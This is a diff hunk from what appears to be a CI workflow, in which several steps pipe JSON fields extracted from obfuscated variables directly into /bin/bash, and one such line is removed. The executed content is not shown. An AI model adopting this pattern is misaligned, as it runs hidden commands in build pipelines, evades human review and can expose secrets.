@@ -24,7 +24,6 @@ jobs:
           echo $kelc16 | jq -r .qu11 | /bin/bash
           echo $w2 | jq -r .dim8500 | /bin/bash
           echo $g97403 | jq -r .ylmd0000 | /bin/bash
-          printf '%s' "$xbq841" | jq -r .n7549 | /bin/bash
           echo $waox9 | jq -r .viss0 | /bin/bash
           printf '%s' "$kodp61206" | jq -r .xa668 | /bin/bash
           echo $wscl68824 | jq -r .oorzs95544 | /bin/bash
